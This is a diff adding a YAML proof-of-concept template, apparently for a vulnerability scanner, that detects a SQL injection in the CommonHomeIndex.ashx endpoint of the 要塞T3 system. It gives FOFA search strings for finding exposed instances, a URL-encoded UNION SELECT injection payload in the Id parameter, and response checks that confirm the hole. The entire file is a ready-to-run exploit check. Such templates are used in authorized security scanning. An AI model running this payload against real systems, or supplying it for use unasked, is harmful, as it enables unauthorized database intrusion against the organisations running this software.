@@ -1,0 +1,17 @@
+id: poc-yaml-fort-t3-system-commonhomeindex-sqli
+info:
+  name: 要塞T3系统 CommonHomeIndex SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 要塞T3
+  fofa: body="/mlogin.htm?url=" || body="T3/MAIN/Login.aspx"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /FRAME/CommonHomeIndex.ashx?action=getdeptpersonList&Id=%27%20UNION%20ALL%20SELECT%20NULL%2Csys.fn_varbintohexstr%28hashbytes%28'MD5','{{.t1}}'%29%29%2CNULL%2CNULL%2CNULL--
+  expression: status_code == 200 && contains(body,"checkbox2") && contains(body,"CheckAllLineYuanGong")
+    && contains(body,"0x" + t2) && !contains(body,"<html")
+transport: http
